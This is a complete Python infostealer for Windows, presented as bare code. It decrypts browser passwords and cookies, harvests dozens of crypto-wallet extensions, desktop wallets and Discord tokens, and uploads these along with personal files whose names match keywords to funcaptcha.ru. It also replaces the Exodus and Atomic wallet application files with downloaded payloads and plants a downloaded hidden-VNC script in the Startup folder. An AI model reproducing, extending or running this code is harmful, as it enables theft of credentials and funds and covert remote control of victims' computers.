["```\nimport base64\nimport json\nimport os\nimport re\nimport sqlite3\nimport shutil\nimport subprocess\nimport zipfile\nimport sys\nfrom urllib.request import Request, urlopen\n\nCURRENT_INTERPRETER = sys.executable\nproc = subprocess.Popen([CURRENT_INTERPRETER, \"-m\", \"pip\", \"install\", \"pycryptodome\", \"pypiwin32\", \"pywin32\",\"requests\"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)\nproc.wait()\ntry:\n    import win32crypt\n    from Crypto.Cipher import AES\n    import requests\nexcept:\n    current_file = os.path.abspath(__file__)\n    subprocess.Popen([CURRENT_INTERPRETER, current_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)\n    exit()\n\nUSER_PROFILE = os.getenv('USERPROFILE')\nAPPDATA = os.getenv('APPDATA')\nLOCALAPPDATA = os.getenv('LOCALAPPDATA')\nSTORAGE_PATH = APPDATA + \"\\\\\\\\gruppe_storage\"\nSTARTUP_PATH = os.path.join(APPDATA, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")\n\nif not os.path.exists(STORAGE_PATH):\n    os.makedirs(STORAGE_PATH)\n\nCHROMIUM_BROWSERS = [\n    {\"name\": \"Google Chrome\", \"path\": os.path.join(LOCALAPPDATA, \"Google\", \"Chrome\", \"User Data\"), \"taskname\": \"chrome.exe\"},\n    {\"name\": \"Microsoft Edge\", \"path\": os.path.join(LOCALAPPDATA, \"Microsoft\", \"Edge\", \"User Data\"), \"taskname\": \"msedge.exe\"},\n    {\"name\": \"Opera\", \"path\": os.path.join(APPDATA, \"Opera Software\", \"Opera Stable\"), \"taskname\": \"opera.exe\"},\n    {\"name\": \"Opera GX\", \"path\": os.path.join(APPDATA, \"Opera Software\", \"Opera GX Stable\"), \"taskname\": \"opera.exe\"},\n    {\"name\": \"Brave\", \"path\": os.path.join(LOCALAPPDATA, \"BraveSoftware\", \"Brave-Browser\", \"User Data\"), \"taskname\": \"brave.exe\"},\n    {\"name\": \"Yandex\", \"path\": os.path.join(APPDATA, \"Yandex\", \"YandexBrowser\", \"User Data\"), \"taskname\": \"yandex.exe\"},\n]\n\nCHROMIUM_SUBPATHS = [\n    {\"name\": \"None\", \"path\": \"\"},\n    {\"name\": \"Default\", \"path\": \"Default\"},\n    {\"name\": \"Profile 1\", \"path\": \"Profile 1\"},\n    {\"name\": \"Profile 2\", \"path\": \"Profile 2\"},\n    {\"name\": \"Profile 3\", \"path\": \"Profile 3\"},\n    {\"name\": \"Profile 4\", \"path\": \"Profile 4\"},\n    {\"name\": \"Profile 5\", \"path\": \"Profile 5\"},\n]\n\nBROWSER_EXTENSIONS = [\n    {\"name\": \"Authenticator\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\bhghoamapcdpbohphigoooaddinpkbai\"},\n    {\"name\": \"Binance\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\fhbohimaelbohpjbbldcngcnapndodjp\"},\n    {\"name\": \"Bitapp\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\fihkakfobkmkjojpchpfgcmhfjnmnfpi\"},\n    {\"name\": \"BoltX\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\aodkkagnadcbobfpggfnjeongemjbjca\"},\n    {\"name\": \"Coin98\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\aeachknmefphepccionboohckonoeemg\"},\n    {\"name\": \"Coinbase\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\hnfanknocfeofbddgcijnmhnfnkdnaad\"},\n    {\"name\": \"Core\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\agoakfejjabomempkjlepdflaleeobhb\"},\n    {\"name\": \"Crocobit\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\pnlfjmlcjdjgkddecgincndfgegkecke\"},\n    {\"name\": \"Equal\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\blnieiiffboillknjnepogjhkgnoapac\"},\n    {\"name\": \"Ever\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\cgeeodpfagjceefieflmdfphplkenlfk\"},\n    {\"name\": \"ExodusWeb3\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\aholpfdialjgjfhomihkjbmgjidlcdno\"},\n    {\"name\": \"Fewcha\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\ebfidpplhabeedpnhjnobghokpiioolj\"},\n    {\"name\": \"Finnie\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\cjmkndjhnagcfbpiemnkdpomccnjblmj\"},\n    {\"name\": \"Guarda\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\hpglfhgfnhbgpjdenjgmdgoeiappafln\"},\n    {\"name\": \"Guild\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\nanjmdknhkinifnkgdcggcfnhdaammmj\"},\n    {\"name\": \"HarmonyOutdated\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\fnnegphlobjdpkhecapkijjdkgcjhkib\"},\n    {\"name\": \"Iconex\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\flpiciilemghbmfalicajoolhkkenfel\"},\n    {\"name\": \"Jaxx Liberty\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\cjelfplplebdjjenllpjcblmjkfcffne\"},\n    {\"name\": \"Kaikas\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\jblndlipeogpafnldhgmapagcccfchpi\"},\n    {\"name\": \"KardiaChain\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\pdadjkfkgcafgbceimcpbkalnfnepbnk\"},\n    {\"name\": \"Keplr\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\dmkamcknogkgcdfhhbddcghachkejeap\"},\n    {\"name\": \"Liquality\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\kpfopkelmapcoipemfendmdcghnegimn\"},\n    {\"name\": \"MEWCX\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\nlbmnnijcnlegkjjpcfjclmcfggfefdm\"},\n    {\"name\": \"MaiarDEFI\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\dngmlblcodfobpdpecaadgfbcggfjfnm\"},\n    {\"name\": \"Martian\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\efbglgofoippbgcjepnhiblaibcnclgk\"},\n    {\"name\": \"Math\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\afbcbjpbpfadlkmhmclhkeeodmamcflc\"},\n    {\"name\": \"Metamask\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\nkbihfbeogaeaoehlefnkodbefgpgknn\"},\n    {\"name\": \"Metamask2\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\ejbalbakoplchlghecdalmeeeajnimhm\"},\n    {\"name\": \"Mobox\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\fcckkdbjnoikooededlapcalpionmalo\"},\n    {\"name\": \"Nami\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\lpfcbjknijpeeillifnkikgncikgfhdo\"},\n    {\"name\": \"Nifty\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\jbdaocneiiinmjbjlgalhcelgbejmnid\"},\n    {\"name\": \"Oxygen\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\fhilaheimglignddkjgofkcbgekhenbh\"},\n    {\"name\": \"PaliWallet\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\mgffkfbidihjpoaomajlbgchddlicgpn\"},\n    {\"name\": \"Petra\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\ejjladinnckdgjemekebdpeokbikhfci\"},\n    {\"name\": \"Phantom\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\bfnaelmomeimhlpmgjnjophhpkkoljpa\"},\n    {\"name\": \"Pontem\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\phkbamefinggmakgklpkljjmgibohnba\"},\n    {\"name\": \"Ronin\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\fnjhmkhhmkbjkkabndcnnogagogbneec\"},\n    {\"name\": \"Safepal\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\lgmpcpglpngdoalbgeoldeajfclnhafa\"},\n    {\"name\": \"Saturn\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\nkddgncdjgjfcddamfgcmfnlhccnimig\"},\n    {\"name\": \"Slope\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\pocmplpaccanhmnllbbkpgfliimjljgo\"},\n    {\"name\": \"Solfare\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\bhhhlbepdkbapadjdnnojkbgioiodbic\"},\n    {\"name\": \"Sollet\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\fhmfendgdocmcbmfikdcogofphimnkno\"},\n    {\"name\": \"Starcoin\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\mfhbebgoclkghebffdldpobeajmbecfk\"},\n    {\"name\": \"Swash\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\cmndjbecilbocjfkibfbifhngkdmjgog\"},\n    {\"name\": \"TempleTezos\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\ookjlbkiijinhpmnjffcofjonbfbgaoc\"},\n    {\"name\": \"TerraStation\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\aiifbnbfobpmeekipheeijimdpnlpgpp\"},\n    {\"name\": \"Tokenpocket\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\mfgccjchihfkkindfppnaooecgfneiii\"},\n    {\"name\": \"Ton\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\nphplpgoakhhjchkkhmiggakijnkhfnd\"},\n    {\"name\": \"Tron\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\ibnejdfjmmkpcnlpebklmnkoeoihofec\"},\n    {\"name\": \"Trust Wallet\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\egjidjbpglichdcondbcbdnbeeppgdph\"},\n    {\"name\": \"Wombat\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\amkmjjmmflddogmhpjloimipbofnfjih\"},\n    {\"name\": \"XDEFI\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\hmeobnfnfcmdkdcmlblgagmfpfboieaf\"},\n    {\"name\": \"XMR.PT\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\eigblbgjknlfbajkfhopmcojidlgcehm\"},\n    {\"name\": \"XinPay\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\bocpokimicclpaiekenaeelehdjllofo\"},\n    {\"name\": \"Yoroi\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\ffnbelfdoeiohenkjibnmadjiehjhajb\"},\n    {\"name\": \"iWallet\", \"path\": \"\\\\\\\\Local Extension Settings\\\\\\\\kncchdigobghenbbaddojjnnaogfppfj\"}\n]\n\nWALLET_PATHS = [\n    {\"name\": \"Atomic\", \"path\": os.path.join(APPDATA, \"atomic\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Exodus\", \"path\": os.path.join(APPDATA, \"Exodus\", \"exodus.wallet\")},\n    {\"name\": \"Electrum\", \"path\": os.path.join(APPDATA, \"Electrum\", \"wallets\")},\n    {\"name\": \"Electrum-LTC\", \"path\": os.path.join(APPDATA, \"Electrum-LTC\", \"wallets\")},\n    {\"name\": \"Zcash\", \"path\": os.path.join(APPDATA, \"Zcash\")},\n    {\"name\": \"Armory\", \"path\": os.path.join(APPDATA, \"Armory\")},\n    {\"name\": \"Bytecoin\", \"path\": os.path.join(APPDATA, \"bytecoin\")},\n    {\"name\": \"Jaxx\", \"path\": os.path.join(APPDATA, \"com.liberty.jaxx\", \"IndexedDB\", \"file__0.indexeddb.leveldb\")},\n    {\"name\": \"Etherium\", \"path\": os.path.join(APPDATA, \"Ethereum\", \"keystore\")},\n    {\"name\": \"Guarda\", \"path\": os.path.join(APPDATA, \"Guarda\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Coinomi\", \"path\": os.path.join(APPDATA, \"Coinomi\", \"Coinomi\", \"wallets\")},\n]\n\nPATHS_TO_SEARCH = [\n    USER_PROFILE + \"\\\\\\\\Desktop\",\n    USER_PROFILE + \"\\\\\\\\Documents\",\n    USER_PROFILE + \"\\\\\\\\Downloads\",\n    USER_PROFILE + \"\\\\\\\\OneDrive\\\\\\\\Documents\",\n    USER_PROFILE + \"\\\\\\\\OneDrive\\\\\\\\Desktop\",\n]\n\nFILE_KEYWORDS = [\n        \"passw\",\n        \"mdp\",\n        \"motdepasse\",\n        \"mot_de_passe\",\n        \"login\",\n        \"secret\",\n        \"account\",\n        \"acount\",\n        \"paypal\",\n        \"banque\",\n        \"metamask\",\n        \"wallet\",\n        \"crypto\",\n        \"exodus\",\n        \"discord\",\n        \"2fa\",\n        \"code\",\n        \"memo\",\n        \"compte\",\n        \"token\",\n        \"backup\",\n        \"seecret\"\n]\n\nALLOWED_EXTENSIONS = [\n    \".txt\",\n    \".log\",\n    \".doc\",\n    \".docx\",\n    \".xls\",\n    \".xlsx\",\n    \".ppt\",\n    \".pptx\",\n    \".odt\",\n    \".pdf\",\n    \".rtf\",\n    \".json\",\n    \".csv\",\n    \".db\",\n    \".jpg\",\n    \".jpeg\",\n    \".png\",\n    \".gif\",\n    \".webp\",\n    \".mp4\"\n]\n\nDISCORD_PATHS = [\n    {\"name\": \"Discord\", \"path\": os.path.join(APPDATA, \"discord\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Discord Canary\", \"path\": os.path.join(APPDATA, \"discordcanary\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Discord PTB\", \"path\": os.path.join(APPDATA, \"discordptb\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Opera\", \"path\": os.path.join(APPDATA, \"Opera Software\", \"Opera Stable\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Opera GX\", \"path\": os.path.join(APPDATA, \"Opera Software\", \"Opera GX Stable\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Amigo\", \"path\": os.path.join(LOCALAPPDATA, \"Amigo\", \"User Data\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Torch\", \"path\": os.path.join(LOCALAPPDATA, \"Torch\", \"User Data\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Kometa\", \"path\": os.path.join(LOCALAPPDATA, \"Kometa\", \"User Data\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Orbitum\", \"path\": os.path.join(LOCALAPPDATA, \"Orbitum\", \"User Data\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"CentBrowser\", \"path\": os.path.join(LOCALAPPDATA, \"CentBrowser\", \"User Data\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"7Star\", \"path\": os.path.join(LOCALAPPDATA, \"7Star\", \"7Star\", \"User Data\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Sputnik\", \"path\": os.path.join(LOCALAPPDATA, \"Sputnik\", \"Sputnik\", \"User Data\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Vivaldi\", \"path\": os.path.join(LOCALAPPDATA, \"Vivaldi\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Chrome SxS\", \"path\": os.path.join(LOCALAPPDATA, \"Google\", \"Chrome SxS\", \"User Data\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Chrome\", \"path\": os.path.join(LOCALAPPDATA, \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Chrome1\", \"path\": os.path.join(LOCALAPPDATA, \"Google\", \"Chrome\", \"User Data\", \"Profile 1\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Chrome2\", \"path\": os.path.join(LOCALAPPDATA, \"Google\", \"Chrome\", \"User Data\", \"Profile 2\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Chrome3\", \"path\": os.path.join(LOCALAPPDATA, \"Google\", \"Chrome\", \"User Data\", \"Profile 3\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Chrome4\", \"path\": os.path.join(LOCALAPPDATA, \"Google\", \"Chrome\", \"User Data\", \"Profile 4\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Chrome5\", \"path\": os.path.join(LOCALAPPDATA, \"Google\", \"Chrome\", \"User Data\", \"Profile 5\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Epic Privacy Browser\", \"path\": os.path.join(LOCALAPPDATA, \"Epic Privacy Browser\", \"User Data\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Microsoft Edge\", \"path\": os.path.join(LOCALAPPDATA, \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Uran\", \"path\": os.path.join(LOCALAPPDATA, \"uCozMedia\", \"Uran\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Yandex\", \"path\": os.path.join(LOCALAPPDATA, \"Yandex\", \"YandexBrowser\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Brave\", \"path\": os.path.join(LOCALAPPDATA, \"BraveSoftware\", \"Brave-Browser\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\")},\n    {\"name\": \"Iridium\", \"path\": os.path.join(LOCALAPPDATA, \"Iridium\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\")}\n]\nDISCORD_TOKENS = []\nPASSWORDS = []\nCOOKIES = []\nDISCORD_IDS = []\n\ndef decrypt_data(data, key):\n    try:\n        iv = data[3:15]\n        data = data[15:]\n        cipher = AES.new(key, AES.MODE_GCM, iv)\n        return cipher.decrypt(data)[:-16].decode()\n    except:\n        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])\n\ndef zip_to_storage(name, source, destination):\n    if os.path.isfile(source):\n        with zipfile.ZipFile(destination + f\"\\\\\\\\{name}.zip\", \"w\") as z:\n            z.write(source, os.path.basename(source))\n    else:\n        with zipfile.ZipFile(destination + f\"\\\\\\\\{name}.zip\", \"w\") as z:\n            for root, dirs, files in os.walk(source):\n                for file in files:\n                    z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(source, '..')))\n\ndef upload_to_server(filepath):\n    for i in range(10):\n        try:\n            url = \"https://funcaptcha[.]ru/delivery\"\n            files = {'file': open(filepath, 'rb')}\n            r = requests.post(url, files=files)\n            if r.status_code == 200:\n                break\n        except: pass\n\ndef validate_discord_token(token):\n    r = requests.get(\"https://discord.com/api/v9/users/@me\", headers={\"Authorization\": token})\n    if r.status_code == 200:\n        return r.json()\n    else:\n        return None\n\ndef taskkill(taskname):\n    subprocess.run([\"taskkill\", \"/F\", \"/IM\", taskname], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\ndef inject():\n    procc = \"exodus.exe\"\n    local = os.getenv(\"localappdata\")\n    path = f\"{local}/exodus\"\n    if not os.path.exists(path): return\n    listOfFile = os.listdir(path)\n    apps = []\n    for file in listOfFile:\n        if \"app-\" in file:\n            apps += [file]\n    exodusPatchURL = \"https://funcaptcha.ru/app.asar\"\n    headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36\"}\n    req = Request(exodusPatchURL, headers=headers)\n    response = urlopen(req)\n    data = response.read()\n    subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n    for app in apps:\n        try:\n            fullpath = f\"{path}/{app}/resources/app.asar\"\n            with open(fullpath, 'wb') as out_file1:\n                out_file1.write(data)\n        except: pass\n\nfor i in range(10):\n    try:\n        inject()\n        break\n    except: pass\ndef inject_atomic():\n    procc = \"Atomic Wallet.exe\"\n    local = os.getenv(\"localappdata\")\n    path = f\"{local}/Programs/atomic\"\n    if not os.path.exists(path): return\n    atomicPatchURL = \"https://funcaptcha[.]ru/atomic/app.asar\"\n    headers = {\"User-Agent\": \"Mozilla/5.0\"}\n    req = Request(atomicPatchURL, headers=headers)\n    response = urlopen(req)\n    data = response.read()\n    subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n    try:\n        fullpath = f\"{path}/resources/app.asar\"\n        with open(fullpath, 'wb') as out_file1:\n            out_file1.write(data)\n    except: pass\n\nfor i in range(10):\n    try:\n        inject_atomic()\n        break\n    except: pass\n\nfor browser in CHROMIUM_BROWSERS:\n    taskkill(browser[\"taskname\"])\n    local_state = os.path.join(browser[\"path\"], \"Local State\")\n    if not os.path.exists(local_state): continue\n    with open(local_state, \"r\", encoding=\"utf-8\") as f:\n        local_state = json.loads(f.read())\n    key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n    decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]\n    for subpath in CHROMIUM_SUBPATHS:\n        if not os.path.exists(os.path.join(browser[\"path\"], subpath[\"path\"])): continue\n        try:\n            login_data_file = os.path.join(browser[\"path\"], subpath[\"path\"], \"Login Data\")\n            temp_db = os.path.join(browser[\"path\"], subpath[\"path\"], f\"{browser['name']}-pw.db\")\n            shutil.copy(login_data_file, temp_db)\n            connection = sqlite3.connect(temp_db)\n            cursor = connection.cursor()\n            cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\")\n            for row in cursor.fetchall():\n                origin_url = row[0]\n                username = row[1]\n                password = decrypt_data(row[2], decryption_key)\n                if username or password:\n                    PASSWORDS.append({\"browser\": browser[\"name\"], \"profile\": subpath[\"name\"], \"url\": origin_url, \"username\": username, \"password\": password})\n            cursor.close()\n            connection.close()\n            os.remove(temp_db)\n        except:\n            pass\n\n        try:\n            cookies_file = os.path.join(browser[\"path\"], subpath[\"path\"], \"Network\", \"Cookies\")\n            temp_db = os.path.join(browser[\"path\"], subpath[\"path\"], \"Network\", f\"{browser['name']}-ck.db\")\n            shutil.copy(cookies_file, temp_db)\n            connection = sqlite3.connect(temp_db)\n            cursor = connection.cursor()\n            cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n            cookie_str = \"\"\n            for row in cursor.fetchall():\n                host = row[0]\n                name = row[1]\n                value = decrypt_data(row[2], decryption_key)\n                cookie_str += f\"{host}\\\\tTRUE\\\\t/\\\\tFALSE\\\\t13355861278849698\\\\t{name}\\\\t{value}\\\\n\"\n            COOKIES.append({\"browser\": browser[\"name\"], \"profile\": subpath[\"name\"], \"cookies\": base64.b64encode(cookie_str.encode()).decode()})\n            cursor.close()\n            connection.close()\n            os.remove(temp_db)\n        except:\n            pass\n        for extension in BROWSER_EXTENSIONS:\n            extension_path = os.path.join(browser[\"path\"], subpath[\"path\"]) + extension[\"path\"]\n            if os.path.exists(extension_path):\n                try:\n                    zip_to_storage(f\"{browser['name']}-{subpath['name']}-{extension['name']}\", extension_path, STORAGE_PATH)\n                except:\n                    pass\nfirefox_path = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')\nif os.path.exists(firefox_path):\n    taskkill(\"firefox.exe\")\n    for profile in os.listdir(firefox_path):\n        try:\n            if profile.endswith('.default') or profile.endswith('.default-release'):\n                profile_path = os.path.join(firefox_path, profile)\n                if os.path.exists(os.path.join(profile_path, \"cookies.sqlite\")):\n                    shutil.copy(os.path.join(profile_path, \"cookies.sqlite\"), os.path.join(profile_path, \"cookies-copy.sqlite\"))\n                    connection = sqlite3.connect(os.path.join(profile_path, \"cookies-copy.sqlite\"))\n                    cursor = connection.cursor()\n                    cursor.execute(\"SELECT host, name, value FROM moz_cookies\")\n                    cookie_str = \"\"\n                    for row in cursor.fetchall():\n                        host, name, value = row\n                        cookie_str += f\"{host}\\\\tTRUE\\\\t/\\\\tFALSE\\\\t13355861278849698\\\\t{name}\\\\t{value}\\\\n\"\n                    COOKIES.append({\"browser\": \"Firefox\", \"profile\": profile, \"cookies\": base64.b64encode(cookie_str.encode()).decode()})\n                    cursor.close()\n                    connection.close()\n                    os.remove(os.path.join(profile_path, \"cookies-copy.sqlite\"))\n        except:\n            continue\n\nfor wallet_file in WALLET_PATHS:\n    if os.path.exists(wallet_file[\"path\"]):\n        try:\n            zip_to_storage(wallet_file[\"name\"], wallet_file[\"path\"], STORAGE_PATH)\n        except:\n            pass\n\nfor discord_path in DISCORD_PATHS:\n    if not os.path.exists(discord_path[\"path\"]): continue\n    try:\n        name_without_spaces = discord_path[\"name\"].replace(\" \", \"\")\n        if \"cord\" in discord_path[\"path\"]:\n            if not os.path.exists(APPDATA + f\"\\\\\\\\{name_without_spaces}\\\\\\\\Local State\"): continue\n            try:\n                with open(APPDATA + f\"\\\\\\\\{name_without_spaces}\\\\\\\\Local State\", \"r\", encoding=\"utf-8\") as f:\n                    local_state = json.loads(f.read())\n                key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n                decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]\n                for file_name in os.listdir(discord_path[\"path\"]):\n                    if file_name[-3:] not in [\"ldb\", \"log\"]: continue\n                    for line in [x.strip() for x in open(f'{discord_path[\"path\"]}\\\\\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                        for y in re.findall(r\"dQw4w9WgXcQ:[^\\\\\"]*\", line):\n                            token = decrypt_data(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), decryption_key)\n                            token_data = validate_discord_token(token)\n                            if token_data:\n                                if token_data[\"id\"] not in DISCORD_IDS:\n                                    DISCORD_IDS.append(token_data[\"id\"])\n                                    username = token_data[\"username\"] if token_data[\"discriminator\"] == \"0\" else f\"{token_data['username']}#{token_data['discriminator']}\"\n                                    phone_number = token_data[\"phone\"] if token_data[\"phone\"] else \"Not linked\"\n                                    DISCORD_TOKENS.append(\n                                        {\"token\": token, \"user_id\": token_data[\"id\"], \"username\": username,\n                                         \"display_name\": token_data[\"global_name\"], \"email\": token_data[\"email\"],\n                                         \"phone\": phone_number})\n            except:\n                pass\n        else:\n            for file_name in os.listdir(discord_path[\"path\"]):\n                if file_name[-3:] not in [\"ldb\", \"log\"]: continue\n                for line in [x.strip() for x in open(f'{discord_path[\"path\"]}\\\\\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                    for token in re.findall(r\"[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{25,110}\", line):\n                        token_data = validate_discord_token(token)\n                        if token_data:\n                            if token_data[\"id\"] not in DISCORD_IDS:\n                                DISCORD_IDS.append(token_data[\"id\"])\n                                username = token_data[\"username\"] if token_data[\"discriminator\"] == \"0\" else f\"{token_data['username']}#{token_data['discriminator']}\"\n                                phone_number = token_data[\"phone\"] if token_data[\"phone\"] else \"Not linked\"\n                                DISCORD_TOKENS.append(\n                                    {\"token\": token, \"user_id\": token_data[\"id\"], \"username\": username,\n                                     \"display_name\": token_data[\"global_name\"], \"email\": token_data[\"email\"],\n                                     \"phone\": phone_number})\n    except:\n        pass\n\nwith open(STORAGE_PATH + \"\\\\\\\\Passwords.txt\", \"w\") as f:\n    f.write(\n        f\"\\\\n{'-'*50}\\\\n\".join([\n            f\"LOCATION: {pw['browser']} - {pw['profile']}\\\\n\"\n            f\"URL: {pw['url']}\\\\n\"\n            f\"USERNAME: {pw['username']}\\\\n\"\n            f\"PASSWORD: {pw['password']}\"\n            for pw in PASSWORDS\n        ])\n    )\nupload_to_server(STORAGE_PATH + \"\\\\\\\\Passwords.txt\")\nfor cookie in COOKIES:\n    with open(STORAGE_PATH + f\"\\\\\\\\Cookies-{cookie['browser']}-{cookie['profile']}.txt\", \"w\") as f:\n        f.write(base64.b64decode(cookie[\"cookies\"]).decode())\n\nfor discord_token in DISCORD_TOKENS:\n    with open(STORAGE_PATH + \"\\\\\\\\discord-tokens.txt\", \"w\") as f:\n        f.write(\n            f\"\\\\n{'-' * 50}\\\\n\".join([\n                f\"ID: {discord_token['user_id']}\\\\n\"\n                f\"USERNAME: {discord_token['username']}\\\\n\"\n                f\"DISPLAY NAME: {discord_token['display_name']}\\\\n\"\n                f\"EMAIL: {discord_token['email']}\\\\n\"\n                f\"PHONE: {discord_token['phone']}\\\\n\"\n                f\"TOKEN: {discord_token['token']}\"\n                for discord_token in DISCORD_TOKENS\n            ])\n        )\n\nfor file_to_upload in os.listdir(STORAGE_PATH):\n    try:\n        upload_to_server(STORAGE_PATH + \"\\\\\\\\\" + file_to_upload)\n    except:\n        pass\nfor path in PATHS_TO_SEARCH:\n    for root, _, files in os.walk(path):\n        for file_name in files:\n            for keyword in FILE_KEYWORDS:\n                if keyword in file_name.lower():\n                    for extension in ALLOWED_EXTENSIONS:\n                        if file_name.endswith(extension):\n                            try:\n                                upload_to_server(os.path.join(root, file_name))\n                            except:\n                                pass\ntry:\n    URL = \"https://funcaptcha.ru/hvnc.py\"\n    r = requests.get(URL)\n    with open(os.path.join(STARTUP_PATH, \"hvnc.py\"), \"wb\") as f:\n        f.write(r.content)\nexcept: pass\ntry:\n    os.remove(STORAGE_PATH)\nexcept: pass \n```"]